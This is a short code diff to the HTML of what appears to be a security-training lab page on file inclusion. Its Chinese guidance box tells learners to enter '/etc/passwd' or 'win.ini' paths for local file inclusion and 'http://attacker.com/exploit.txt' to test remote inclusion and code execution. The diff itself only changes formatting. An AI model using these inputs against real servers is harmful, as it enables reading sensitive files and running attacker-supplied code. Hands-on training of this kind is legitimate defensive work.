@@ -92,8 +92,8 @@ Warning: Exploit executed successfully! Shell connection established.</pre>
                     
                     <div class="alert alert-warning mt-4">
                         💡 <strong>檔案引入演練指引：</strong><br>
-                        1. **本地檔案引入 (LFI)**：輸入 <code>/etc/passwd</code> (Linux) 或 <code>C:\\windows\\win.ini</code> (Windows)，觀察是否成功讀取到伺服器敏感設定檔。<br>
-                        2. **遠端檔案引入 (RFI)**：輸入 <code>http://attacker.com/exploit.txt</code>，觀察伺服器是否會直接向外部請求腳本，將其加載並執行 (RCE)。
+                        1. <strong>本地檔案引入 (LFI)</strong>：輸入 <code>/etc/passwd</code> (Linux) 或 <code>C:\\windows\\win.ini</code> (Windows)，觀察是否成功讀取到伺服器敏感設定檔。<br>
+                        2. <strong>遠端檔案引入 (RFI)</strong>：輸入 <code>http://attacker.com/exploit.txt</code>，觀察伺服器是否會直接向外部請求腳本，將其加載並執行 (RCE)。
                     </div>
                 </div>
             </div>
